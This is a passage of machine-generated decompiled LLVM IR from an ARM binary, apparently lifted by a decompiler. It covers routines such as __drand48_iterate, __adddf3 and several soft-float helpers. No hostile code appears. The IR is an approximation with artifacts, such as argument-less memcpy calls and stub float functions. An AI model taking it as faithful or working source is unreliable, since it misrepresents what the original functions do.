  br i1 %v3_344cc, label %dec_label_pc_344d4, label %dec_label_pc_34514

dec_label_pc_344d4:                               ; preds = %dec_label_pc_344cc
  %v1_344d4 = trunc i32 %v0_344d4 to i8
  %v4_344d4 = add i32 %v0_344b8, %v0_344a8
  %v5_344d4 = inttoptr i32 %v4_344d4 to i8*
  store i8 %v1_344d4, i8* %v5_344d4, align 1
  %v0_344d8 = call i32 @memcpy()
  store i32 %v0_344d8, i32* @r0, align 4
  %v0_344dc = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_344dc = icmp slt i32 %v0_344dc, 0
  store i1 %v1_344dc, i1* %cpsr_n.global-to-local, align 1
  %v2_344dc = icmp eq i32 %v0_344dc, 0
  store i1 %v2_344dc, i1* %cpsr_z.global-to-local, align 1
  %v0_344e0 = load i32, i32* @r5, align 4
  %v1_344e0 = load i32, i32* %r7.global-to-local, align 4
  %v2_344e0 = add i32 %v1_344e0, %v0_344e0
  store i32 %v2_344e0, i32* %sl.global-to-local, align 4
  br i1 %v2_344dc, label %dec_label_pc_34500, label %dec_label_pc_344d4.dec_label_pc_344e8_crit_edge

dec_label_pc_344d4.dec_label_pc_344e8_crit_edge:  ; preds = %dec_label_pc_344d4
  %v0_344e8.pre = load i32, i32* @r4, align 4
  store i32 %v0_344e8.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_344e8 = icmp slt i32 %v0_344e8.pre, 0
  store i1 %v1_344e8, i1* %cpsr_n.global-to-local, align 1
  %v2_344e8 = icmp eq i32 %v0_344e8.pre, 0
  store i1 %v2_344e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_344e8, label %dec_label_pc_34500, label %dec_label_pc_344f4

dec_label_pc_344f4:                               ; preds = %entry, %dec_label_pc_344d4.dec_label_pc_344e8_crit_edge
  %v0_3448c26 = phi i32 [ %v0_344e8.pre, %dec_label_pc_344d4.dec_label_pc_344e8_crit_edge ], [ %tmp, %entry ]
  %v5_34508525 = phi i32 [ %v2_344e0, %dec_label_pc_344d4.dec_label_pc_344e8_crit_edge ], [ 0, %entry ]
  %v1_344f4 = inttoptr i32 %v0_3448c26 to i8*
  %v2_344f4 = load i8, i8* %v1_344f4, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_344f8 = icmp eq i8 %v2_344f4, 0
  store i1 %v2_344f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_344f8, label %dec_label_pc_34500, label %dec_label_pc_3448c

dec_label_pc_34500:                               ; preds = %dec_label_pc_344d4.dec_label_pc_344e8_crit_edge, %dec_label_pc_344d4, %dec_label_pc_344f4, %entry
  %v8_3450c = phi i32 [ 0, %entry ], [ %v5_34508525, %dec_label_pc_344f4 ], [ %v2_344e0, %dec_label_pc_344d4 ], [ %v2_344e0, %dec_label_pc_344d4.dec_label_pc_344e8_crit_edge ]
  %v0_34500 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_34500 = icmp slt i32 %v0_34500, 0
  store i1 %v1_34500, i1* %cpsr_n.global-to-local, align 1
  %v2_34500 = icmp eq i32 %v0_34500, 0
  store i1 %v2_34500, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_34500, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_34500
  %v6_34508 = add i32 %v8_3450c, 1
  store i32 %v6_34508, i32* @r0, align 4
  %v7_3450c = load i32, i32* %r8.global-to-local, align 4
  %v9_3450c = add i32 %v7_3450c, %v8_3450c
  %v10_3450c = inttoptr i32 %v9_3450c to i8*
  store i8 0, i8* %v10_3450c, align 1
  %v0_34510.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_34510.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_34510.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_34500, %bb
  %v2_34510 = phi i1 [ %v2_34510.pre, %bb ], [ false, %dec_label_pc_34500 ]
  %v1_34510 = phi i1 [ %v1_34510.pre, %bb ], [ %v1_34500, %dec_label_pc_34500 ]
  %v0_34510 = phi i1 [ %v0_34510.pre, %bb ], [ %v2_34500, %dec_label_pc_34500 ]
  %v3_34510 = xor i1 %v2_34510, %v1_34510
  %v4_34510 = or i1 %v0_34510, %v3_34510
  br i1 %v4_34510, label %dec_label_pc_34514, label %.dec_label_pc_34518_crit_edge

.dec_label_pc_34518_crit_edge:                    ; preds = %bb22
  %v1_3451c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_34518

dec_label_pc_34514:                               ; preds = %dec_label_pc_344cc, %dec_label_pc_344a8, %bb22
  br label %dec_label_pc_34518

dec_label_pc_34518:                               ; preds = %.dec_label_pc_34518_crit_edge, %dec_label_pc_34514
  %v1_3451c = phi i32 [ %v1_3451c.pre, %.dec_label_pc_34518_crit_edge ], [ -1, %dec_label_pc_34514 ]
  %v2_34518 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_34518, i32* @r4, align 4
  store i32 %v6_34474, i32* @r5, align 4
  store i32 %v9_34474, i32* @r6, align 4
  ret i32 %v1_3451c

; uselistorder directives
  uselistorder i32 %v0_34500, { 0, 2, 1 }
  uselistorder i32 %v0_344e8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_344dc, { 1, 0 }
  uselistorder i32 %v2_344cc, { 1, 0 }
  uselistorder i32 %v1_344c0, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_344d4, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_344a4, { 1, 0 }
  uselistorder i1 %v2_344e824, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i8 0, { 18, 68, 69, 4, 5, 70, 71, 72, 74, 73, 75, 13, 76, 46, 77, 20, 21, 78, 14, 80, 79, 22, 23, 24, 25, 26, 82, 81, 49, 83, 15, 84, 85, 86, 47, 48, 88, 89, 87, 91, 90, 50, 92, 27, 93, 94, 28, 95, 96, 98, 97, 51, 99, 52, 100, 101, 102, 103, 107, 105, 54, 106, 6, 53, 108, 7, 104, 29, 109, 16, 110, 66, 111, 30, 31, 32, 33, 34, 35, 112, 113, 114, 115, 116, 55, 36, 37, 38, 39, 40, 118, 119, 120, 121, 117, 41, 42, 0, 122, 123, 124, 43, 19, 126, 125, 44, 127, 128, 129, 56, 130, 131, 17, 132, 133, 134, 135, 8, 136, 137, 138, 139, 140, 141, 142, 143, 9, 144, 145, 148, 146, 147, 57, 149, 150, 151, 10, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 1, 163, 2, 164, 165, 45, 166, 167, 168, 169, 170, 171, 11, 172, 173, 174, 176, 175, 58, 177, 178, 179, 12, 180, 181, 182, 183, 184, 185, 186, 187, 188, 191, 189, 190, 192, 193, 194, 195, 196, 199, 198, 59, 197, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 65, 213, 214, 215, 218, 216, 217, 219, 222, 220, 221, 223, 224, 225, 226, 228, 229, 227, 60, 230, 231, 62, 232, 61, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 3, 254, 255, 256, 257, 64, 258, 63, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 273, 272, 67, 274, 275, 276, 277 }
  uselistorder i32 ()* @memcpy, { 20, 45, 53, 52, 43, 19, 18, 15, 14, 13, 12, 44, 11, 5, 4, 17, 16, 10, 42, 9, 8, 51, 50, 49, 48, 47, 3, 2, 1, 6, 0, 41, 40, 46, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 7 }
  uselistorder i32 (i8*)* @strlen, { 20, 79, 85, 84, 83, 82, 81, 80, 14, 13, 12, 10, 4, 78, 77, 88, 87, 11, 3, 2, 1, 86, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 94, 93, 92, 91, 90, 89, 56, 55, 19, 18, 17, 16, 15, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 31, 33, 32, 30, 0, 29, 28, 27, 26, 25, 24, 23, 22, 21, 9, 8, 6, 7, 5 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 10, 7, 6, 2, 1, 0, 9, 4, 3, 5, 12, 8, 11 }
  uselistorder i32 46, { 1, 2, 3, 9, 10, 8, 11, 12, 4, 6, 7, 0, 5 }
  uselistorder i8* null, { 0, 1, 3, 4, 5, 6, 7, 2, 8, 9 }
  uselistorder label %dec_label_pc_34518, { 1, 0 }
  uselistorder label %dec_label_pc_34514, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_34500, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_344f4, { 1, 0 }
  uselistorder label %dec_label_pc_344a8, { 1, 0 }
}

define i32 @__drand48_iterate() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_34520 = load i32, i32* @r1, align 4
  %v1_34520 = add i32 %v0_34520, 14
  %v2_34520 = inttoptr i32 %v1_34520 to i16*
  %v3_34520 = load i16, i16* %v2_34520, align 2
  %v2_34524 = icmp eq i16 %v3_34520, 0
  %v3_34528 = load i32, i32* @r4, align 4
  store i32 %v3_34528, i32* %stack_var_-20, align 4
  store i32 %v0_34520, i32* %lr.global-to-local, align 4
  %v0_34530 = load i32, i32* @r0, align 4
  store i32 %v0_34530, i32* %r7.global-to-local, align 4
  br i1 %v2_34524, label %dec_label_pc_34538, label %dec_label_pc_34558

dec_label_pc_34538:                               ; preds = %entry
  store i32 5, i32* %r4.global-to-local, align 4
  %v2_34540 = add i32 %v0_34520, 16
  %v3_34540 = inttoptr i32 %v2_34540 to i32*
  store i32 -554899859, i32* %v3_34540, align 4
  %v0_34544 = load i32, i32* %r4.global-to-local, align 4
  %v1_34544 = load i32, i32* @r1, align 4
  %v2_34544 = add i32 %v1_34544, 20
  %v3_34544 = inttoptr i32 %v2_34544 to i32*
  store i32 %v0_34544, i32* %v3_34544, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r1.global-to-local, align 4
  %v2_34550 = load i32, i32* %lr.global-to-local, align 4
  %v3_34550 = add i32 %v2_34550, 12
  %v4_34550 = inttoptr i32 %v3_34550 to i16*
  store i16 11, i16* %v4_34550, align 2
  %v0_34554 = load i32, i32* %r2.global-to-local, align 4
  %v1_34554 = trunc i32 %v0_34554 to i16
  %v2_34554 = load i32, i32* %lr.global-to-local, align 4
  %v3_34554 = add i32 %v2_34554, 14
  %v4_34554 = inttoptr i32 %v3_34554 to i16*
  store i16 %v1_34554, i16* %v4_34554, align 2
  %v0_34558.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_34570.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_34558

dec_label_pc_34558:                               ; preds = %entry, %dec_label_pc_34538
  %v0_34594 = phi i32 [ %v0_34520, %entry ], [ %v0_34570.pre, %dec_label_pc_34538 ]
  %v2_345bc = phi i32 [ %v0_34530, %entry ], [ %v0_34558.pre, %dec_label_pc_34538 ]
  %v1_34558 = add i32 %v2_345bc, 4
  %v2_34558 = inttoptr i32 %v1_34558 to i16*
  %v3_34558 = load i16, i16* %v2_34558, align 2
  %v4_34558 = zext i16 %v3_34558 to i32
  %v1_3455c = inttoptr i32 %v2_345bc to i16*
  %v2_3455c = load i16, i16* %v1_3455c, align 2
  %v3_3455c = zext i16 %v2_3455c to i32
  store i32 %v3_3455c, i32* %r1.global-to-local, align 4
  %v1_34560 = add i32 %v2_345bc, 2
  %v2_34560 = inttoptr i32 %v1_34560 to i16*
  %v3_34560 = load i16, i16* %v2_34560, align 2
  %v4_34560 = zext i16 %v3_34560 to i32
  store i32 %v4_34558, i32* %r4.global-to-local, align 4
  %v1_34570 = add i32 %v0_34594, 20
  %v2_34570 = inttoptr i32 %v1_34570 to i32*
  %v3_34570 = load i32, i32* %v2_34570, align 4
  %v3_34578 = mul nuw i32 %v4_34560, 65536
  %v2_3457c = or i32 %v3_34578, %v3_3455c
  store i32 %v2_3457c, i32* %r1.global-to-local, align 4
  %v2_34580 = mul i32 %v3_34570, %v2_3457c
  %v1_34584 = add i32 %v0_34594, 16
  %v2_34584 = inttoptr i32 %v1_34584 to i32*
  %v3_34584 = load i32, i32* %v2_34584, align 4
  %v3_3458c = mul i32 %v3_34584, %v4_34558
  %v4_3458c = add i32 %v3_3458c, %v2_34580
  store i32 %v4_3458c, i32* %r2.global-to-local, align 4
  %v1_34590 = zext i32 %v3_34584 to i64
  %v3_34590 = zext i32 %v2_3457c to i64
  %v4_34590 = mul nuw i64 %v1_34590, %v3_34590
  %v5_34590 = udiv i64 %v4_34590, 4294967296
  %v6_34590 = trunc i64 %v5_34590 to i32
  %v7_34590 = trunc i64 %v4_34590 to i32
  store i32 %v6_34590, i32* %r4.global-to-local, align 4
  %v1_34594 = add i32 %v0_34594, 12
  %v2_34594 = inttoptr i32 %v1_34594 to i16*
  %v3_34594 = load i16, i16* %v2_34594, align 2
  %v4_34594 = zext i16 %v3_34594 to i32
  %v2_34598 = add i32 %v6_34590, %v4_3458c
  %v2_3459c = add i32 %v4_34594, %v7_34590
  %v3_3459c = icmp ult i32 %v2_3459c, %v7_34590
  %v2_345a0 = zext i1 %v3_3459c to i32
  %v3_345a0 = add i32 %v2_345a0, %v2_34598
  store i32 %v3_345a0, i32* %r2.global-to-local, align 4
  store i32 %v2_3459c, i32* %r5.global-to-local, align 4
  %v3_345ac = udiv i32 %v2_3459c, 65536
  %v4_345b0 = mul i32 %v3_345a0, 65536
  %v5_345b0 = or i32 %v4_345b0, %v3_345ac
  store i32 %v5_345b0, i32* %r1.global-to-local, align 4
  %v1_345bc = trunc i32 %v3_345a0 to i16
  store i16 %v1_345bc, i16* %v2_34558, align 2
  %v0_345c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_345c0 = trunc i32 %v0_345c0 to i16
  %v2_345c0 = load i32, i32* %r7.global-to-local, align 4
  %v3_345c0 = add i32 %v2_345c0, 2
  %v4_345c0 = inttoptr i32 %v3_345c0 to i16*
  store i16 %v1_345c0, i16* %v4_345c0, align 2
  %v0_345c4 = load i32, i32* %r5.global-to-local, align 4
  %v1_345c4 = trunc i32 %v0_345c4 to i16
  %v2_345c4 = load i32, i32* %r7.global-to-local, align 4
  %v3_345c4 = inttoptr i32 %v2_345c4 to i16*
  store i16 %v1_345c4, i16* %v3_345c4, align 2
  %v2_345c8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_345c8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_345a0, { 1, 0, 2 }
  uselistorder i32 %v7_34590, { 1, 0 }
  uselistorder i64 %v4_34590, { 1, 0 }
  uselistorder i32 %v3_34584, { 1, 0 }
  uselistorder i32 %v2_3457c, { 1, 0, 2 }
  uselistorder i32 %v2_345bc, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %lr.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 11, { 35, 36, 32, 33, 17, 27, 18, 19, 24, 25, 26, 34, 44, 1, 28, 37, 14, 15, 16, 38, 39, 40, 41, 42, 43, 0, 3, 29, 2, 31, 20, 21, 22, 8, 7, 6, 5, 4, 13, 12, 11, 10, 9, 30, 23 }
  uselistorder i32 5, { 54, 55, 50, 51, 52, 19, 20, 21, 22, 15, 14, 43, 23, 11, 44, 24, 45, 26, 25, 12, 0, 59, 27, 53, 16, 46, 28, 47, 17, 56, 18, 1, 57, 58, 29, 30, 48, 31, 49, 32, 33, 41, 2, 34, 42, 3, 4, 5, 35, 6, 36, 7, 37, 13, 8, 38, 9, 39, 40, 10 }
  uselistorder i16 0, { 11, 12, 13, 14, 8, 0, 1, 2, 15, 9, 3, 4, 5, 6, 7, 10, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i32 14, { 24, 25, 0, 26, 16, 19, 22, 17, 18, 28, 20, 23, 21, 9, 10, 11, 12, 13, 14, 15, 27, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_34558, { 1, 0 }
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__aeabi_drsub(double %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = sext i32 %arg3 to i64
  %v8_34624 = bitcast i64 %tmp to double
  %v9_34624 = fadd double %v8_34624, %arg1
  %v10_34624 = fptrunc double %v9_34624 to float
  %v11_34624 = bitcast float %v10_34624 to i32
  ret i32 %v11_34624
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_34628 = load i32, i32* @r0, align 4
  ret i32 %v2_34628
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_3462c = load i32, i32* @r4, align 4
  store i32 %v3_3462c, i32* %stack_var_-12, align 4
  %v6_3462c = load i32, i32* @r5, align 4
  %v9_3462c = load i32, i32* @lr, align 4
  %v0_34630 = load i32, i32* %r1.global-to-local, align 4
  %v2_34630 = mul i32 %v0_34630, 2
  store i32 %v2_34630, i32* %r4.global-to-local, align 4
  %v0_34634 = load i32, i32* %r3.global-to-local, align 4
  %v2_34634 = mul i32 %v0_34634, 2
  store i32 %v2_34634, i32* %r5.global-to-local, align 4
  %v4_34638 = icmp eq i32 %v2_34634, %v2_34630
  %v1_3463c = load i32, i32* %r0.global-to-local, align 4
  br i1 %v4_34638, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_3463c = load i32, i32* %r2.global-to-local, align 4
  %v5_3463c = icmp eq i32 %v2_3463c, %v1_3463c
  br i1 %v5_3463c, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_34640 = or i32 %v1_3463c, %v2_34630
  %v5_34640 = icmp eq i32 %v3_34640, 0
  br i1 %v5_34640, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_34644 = load i32, i32* %r2.global-to-local, align 4
  %v3_34644 = or i32 %v2_34644, %v2_34634
  %v5_34644 = icmp eq i32 %v3_34644, 0
  br i1 %v5_34644, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_34630.off = add i32 %v2_34630, 4194303
  %tmp = icmp ult i32 %v2_34630.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_34634.off = add i32 %v2_34634, 4194303
  %tmp17 = icmp ult i32 %v2_34634.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_34650 = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_34650, i32 ptrtoint (i32* @global_var_34888.2234 to i32))
  %v0_34654 = load i32, i32* %r4.global-to-local, align 4
  %v3_34654 = udiv i32 %v0_34654, 2097152
  store i32 %v3_34654, i32* %r4.global-to-local, align 4
  %v1_34658 = load i32, i32* %r5.global-to-local, align 4
  %v4_34658 = udiv i32 %v1_34658, 2097152
  %v5_34658 = sub nsw i32 %v4_34658, %v3_34654
  %v5_3465c = icmp ult i32 %v4_34658, %v3_34654
  br i1 %v5_3465c, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_3465c = sub nsw i32 0, %v5_34658
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_3465c, %bb13 ], [ %v5_34658, %.thread3 ]
  %v0_34680 = phi i32 [ %v7_3465c, %bb13 ], [ %v5_34658, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_34660 = icmp ugt i32 %v4_34658, %v3_34654
  br i1 %v7_34660, label %dec_label_pc_34664, label %dec_label_pc_34680

dec_label_pc_34664:                               ; preds = %bb14
  %v2_34664 = add nsw i32 %v0_34680, %v3_34654
  store i32 %v2_34664, i32* %r4.global-to-local, align 4
  %v0_34668 = load i32, i32* %r0.global-to-local, align 4
  %v1_34668 = load i32, i32* %r2.global-to-local, align 4
  %v0_3466c = load i32, i32* %r1.global-to-local, align 4
  %v1_3466c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_34668, i32* %r0.global-to-local, align 4
  store i32 %v1_3466c, i32* %r1.global-to-local, align 4
  store i32 %v0_34668, i32* %r2.global-to-local, align 4
  store i32 %v0_3466c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_34680

dec_label_pc_34680:                               ; preds = %bb14, %dec_label_pc_34664
  %tmp18 = icmp ugt i32 %v0_34680, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_34680
  %v6_34684 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_34684, i32* %r4.global-to-local, align 4
  store i32 %v6_3462c, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_34680, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_3462c)
  %v0_3468c = load i32, i32* %r1.global-to-local, align 4
  %v3_3468c = icmp sgt i32 %v0_3468c, -1
  %v4_34698 = urem i32 %v0_3468c, 1048576
  %v5_34698 = or i32 %v4_34698, 1048576
  store i32 %v5_34698, i32* %r1.global-to-local, align 4
  br i1 %v3_3468c, label %dec_label_pc_346a8, label %dec_label_pc_346a0

dec_label_pc_346a0:                               ; preds = %bb16
  %v0_346a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_346a0 = sub i32 0, %v0_346a0
  store i32 %v1_346a0, i32* %r0.global-to-local, align 4
  %v2_346a0 = icmp eq i32 %v0_346a0, 0
  %v2_346a4 = icmp eq i1 %v2_346a0, false
  %v5_346a4 = sext i1 %v2_346a4 to i32
  %v6_346a4 = sub nsw i32 %v5_346a4, %v5_34698
  store i32 %v6_346a4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_346a8

dec_label_pc_346a8:                               ; preds = %bb16, %dec_label_pc_346a0
  %v0_346a8 = load i32, i32* %r3.global-to-local, align 4
  %v3_346a8 = icmp sgt i32 %v0_346a8, -1
  %v4_346b0 = urem i32 %v0_346a8, 1048576
  %v5_346b0 = or i32 %v4_346b0, 1048576
  store i32 %v5_346b0, i32* %r3.global-to-local, align 4
  br i1 %v3_346a8, label %dec_label_pc_346c0, label %dec_label_pc_346b8

dec_label_pc_346b8:                               ; preds = %dec_label_pc_346a8
  %v0_346b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_346b8 = sub i32 0, %v0_346b8
  store i32 %v1_346b8, i32* %r2.global-to-local, align 4
  %v2_346b8 = icmp eq i32 %v0_346b8, 0
  %v2_346bc = icmp eq i1 %v2_346b8, false
  %v5_346bc = sext i1 %v2_346bc to i32
  %v6_346bc = sub nsw i32 %v5_346bc, %v5_346b0
  store i32 %v6_346bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_346c0

dec_label_pc_346c0:                               ; preds = %dec_label_pc_346a8, %dec_label_pc_346b8
  %v0_346c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_346c0 = load i32, i32* %r5.global-to-local, align 4
  %v4_346c0 = icmp eq i32 %v1_346c0, %v0_346c0
  call void @__pseudo_cond_branch(i1 %v4_346c0, i32 ptrtoint (i32* @global_var_34870.2235 to i32))
  %v1_346c4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_346c4

; uselistorder directives
  uselistorder i32 %v0_346a8, { 1, 0 }
  uselistorder i32 %v0_3468c, { 1, 0 }
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_34658, { 2, 1, 0 }
  uselistorder i32 %v3_34654, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_3463c, { 1, 0 }
  uselistorder i32 %v2_34634, { 1, 3, 0, 2 }
  uselistorder i32 %v2_34630, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 6, 0, 1, 2 }
  uselistorder label %dec_label_pc_346c0, { 1, 0 }
  uselistorder label %dec_label_pc_346a8, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_34680, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_346c8() local_unnamed_addr {
dec_label_pc_346c8:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_346c8 = load i32, i32* @r4, align 4
  %v1_346c8 = add i32 %v0_346c8, -1
  store i32 %v1_346c8, i32* @r4, align 4
  %v0_346cc = load i32, i32* @r5, align 4
  %v1_346cc = sub i32 32, %v0_346cc
  store i32 %v1_346cc, i32* @lr, align 4
  %v5_346d0 = icmp sgt i32 %v0_346cc, 32
  br i1 %v5_346d0, label %dec_label_pc_346ec, label %dec_label_pc_346d4

dec_label_pc_346d4:                               ; preds = %dec_label_pc_346c8
  %v0_346d4 = load i32, i32* @r2, align 4
  %v6_346d4 = shl i32 %v0_346d4, %v1_346cc
  store i32 %v6_346d4, i32* %ip.global-to-local, align 4
  %v0_346d8 = load i32, i32* @r0, align 4
  %v3_346d8 = add i32 %v0_346cc, -1
  %v4_346d8 = shl i32 1, %v3_346d8
  %v7_346d8 = lshr i32 %v0_346d4, %v0_346cc
  %v8_346d8 = add i32 %v0_346d8, %v7_346d8
  %v9_346d8 = icmp ult i32 %v8_346d8, %v0_346d8
  %v0_346dc = load i32, i32* @r1, align 4
  %v2_346dc = zext i1 %v9_346d8 to i32
  %v3_346dc = add i32 %v2_346dc, %v0_346dc
  %v1_346e0 = load i32, i32* @r3, align 4
  %v7_346e0 = shl i32 %v1_346e0, %v1_346cc
  %v8_346e0 = add i32 %v7_346e0, %v8_346d8
  store i32 %v8_346e0, i32* %r0.global-to-local, align 4
  %v5_346e4 = and i32 %v1_346e0, %v4_346d8
  %v6_346e4 = icmp ne i32 %v5_346e4, 0
  %v7_346e4 = ashr i32 %v1_346e0, %v0_346cc
  %v9_346e4 = add i32 %v3_346dc, %v7_346e4
  %v10_346e4 = zext i1 %v6_346e4 to i32
  %v11_346e4 = add i32 %v10_346e4, %v9_346e4
  br label %dec_label_pc_34708

dec_label_pc_346ec:                               ; preds = %dec_label_pc_346c8
  %v1_346ec = add i32 %v0_346cc, -32
  %v1_346f0 = add i32 %v1_346cc, 32
  store i32 %v1_346f0, i32* @lr, align 4
  %v0_346f8 = load i32, i32* @r3, align 4
  %v2_346f8 = add i32 %v1_346cc, 31
  %v3_346f8 = lshr i32 -2147483648, %v2_346f8
  %v4_346f8 = and i32 %v0_346f8, %v3_346f8
  %v5_346f8 = icmp ne i32 %v4_346f8, 0
  %v6_346f8 = shl i32 %v0_346f8, %v1_346f0
  %v2_346fc = or i32 %v6_346f8, 2
  %v2_346fc.v6_346f8 = select i1 %v5_346f8, i32 %v2_346fc, i32 %v6_346f8
  store i32 %v2_346fc.v6_346f8, i32* %ip.global-to-local, align 4
  %v0_34700 = load i32, i32* @r0, align 4
  %v7_34700 = ashr i32 %v0_346f8, %v1_346ec
  %v8_34700 = add i32 %v0_34700, %v7_34700
  store i32 %v8_34700, i32* %r0.global-to-local, align 4
  %v0_34704 = load i32, i32* @r1, align 4
  %v2_34704 = and i32 %v0_346f8, 1073741824
  %v3_34704 = icmp ne i32 %v2_34704, 0
  %v4_34704 = ashr i32 %v0_346f8, 31
  %v6_34704 = add i32 %v0_34704, %v4_34704
  %v7_34704 = zext i1 %v3_34704 to i32
  %v8_34704 = add i32 %v6_34704, %v7_34704
  br label %dec_label_pc_34708

